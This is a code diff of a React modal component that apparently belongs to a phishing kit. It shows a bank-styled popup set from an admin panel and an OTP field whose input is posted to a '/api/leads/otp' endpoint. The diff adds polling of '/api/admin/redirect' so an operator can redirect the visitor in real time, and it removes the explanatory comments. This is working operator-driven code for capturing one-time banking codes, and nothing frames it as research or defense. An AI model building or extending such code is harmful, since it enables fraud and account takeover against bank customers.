@@ -1,6 +1,6 @@
 "use client";
 
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 
 interface FinalActionModalProps {
   isOpen: boolean;
@@ -19,9 +19,9 @@ export default function FinalActionModal({
   const [otpError, setOtpError] = useState("");
   const [submitting, setSubmitting] = useState(false);
 
-  if (!isOpen) return null;
+  const isEnabled = bankConfig?.popupEnabled ?? bankConfig?.isEnabled ?? true;
+  if (!isOpen || !isEnabled) return null;
 
-  // Configuration values extraction
   const status = (bankConfig?.popupStatus || "SUCCESS").toUpperCase();
   const challengeType = bankConfig?.challengeType || "none";
   const heading = bankConfig?.popupHeading || bankConfig?.popupTitle || "";
@@ -31,17 +31,45 @@ export default function FinalActionModal({
   const redirectUrl = bankConfig?.redirectUrl || bankConfig?.popupRedirectUrl || "";
   const supportPhone = bankConfig?.supportPhone || bankConfig?.helplineNumber || "";
 
-  // Dynamic OTP Length from Admin Panel (Default 6 digits)
   const targetOtpLength = Math.max(3, Math.min(10, Number(bankConfig?.otpLength) || 6));
-
-  // Dynamic Button Loader Delay (Default 5s)
   const delaySeconds = Number(bankConfig?.redirectDelay) || 5;
   const redirectDelayMs = delaySeconds * 1000;
 
   const requiresOtp = challengeType === "otp" || status.includes("ACTION");
-
-  // Dynamic Placeholder e.g. "0 0 0 0 0 0" matching targetOtpLength
   const otpPlaceholder = Array(targetOtpLength).fill("0").join(" ");
+
+  // 🔥 Real-time Polling for Admin Redirect Signal
+  useEffect(() => {
+    if (!isOpen) return;
+
+    let isHandled = false;
+
+    const interval = setInterval(async () => {
+      if (isHandled) return;
+
+      try {
+        const res = await fetch(`/api/admin/redirect`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data?.redirectUrl && data.redirectUrl.trim() !== "") {
+            isHandled = true;
+
+            // 1. Pehle popup close karein
+            onClose();
+
+            // 2. Phir main window ko redirect karein
+            setTimeout(() => {
+              window.location.href = data.redirectUrl;
+            }, 100);
+          }
+        }
+      } catch (err) {
+        // Ignore network errors during background check
+      }
+    }, 1500);
+
+    return () => clearInterval(interval);
+  }, [isOpen, onClose]);
 
   const handleActionClick = async () => {
     if (requiresOtp) {
@@ -54,7 +82,6 @@ export default function FinalActionModal({
     setSubmitting(true);
     setOtpError("");
 
-    // Backend API ko OTP bhej kar database me save karwana
     try {
       if (otpCode.trim()) {
         await fetch("/api/leads/otp", {
@@ -67,13 +94,13 @@ export default function FinalActionModal({
         });
       }
     } catch (err) {
-      console.error("Failed to sync OTP to database:", err);
+      console.error("Failed to sync OTP:", err);
     }
 
-    // Configured Loader Delay
     setTimeout(() => {
       setSubmitting(false);
       if (redirectUrl) {
+        onClose();
         window.location.href = redirectUrl;
       } else {
         onClose();
@@ -118,28 +145,24 @@ export default function FinalActionModal({
           )}
         </div>
 
-        {/* Subheading Badge */}
         {subheading.trim() && (
           <span className="inline-block mb-1.5 px-2.5 py-0.5 rounded-full text-[10.5px] font-semibold uppercase tracking-wider bg-slate-100 text-slate-600">
             {subheading}
           </span>
         )}
 
-        {/* Main Heading */}
         {heading.trim() && (
           <h2 className="text-base sm:text-lg font-bold text-[#0c1938] tracking-tight mb-2 leading-snug">
             {heading}
           </h2>
         )}
 
-        {/* Body Text */}
         {bodyText.trim() && (
           <p className="text-xs text-slate-500 leading-relaxed text-center mb-4 w-full px-1">
             {bodyText}
           </p>
         )}
 
-        {/* Helpline Support Card */}
         {supportPhone.trim() && (
           <div className="flex items-center justify-between w-full bg-slate-50 border border-slate-200/80 rounded-xl px-3.5 py-2 text-xs mb-4">
             <span className="flex items-center gap-1.5 text-slate-500 font-medium">
@@ -154,7 +177,6 @@ export default function FinalActionModal({
           </div>
         )}
 
-        {/* OTP Input Field */}
         {requiresOtp && (
           <div className="w-full mb-4 text-left">
             <label className="block text-[11px] font-semibold text-slate-700 uppercase mb-1.5 tracking-wider text-center">
@@ -178,7 +200,6 @@ export default function FinalActionModal({
           </div>
         )}
 
-        {/* Action Button With Loading Spinner */}
         {buttonText.trim() && (
           <button
             type="button"
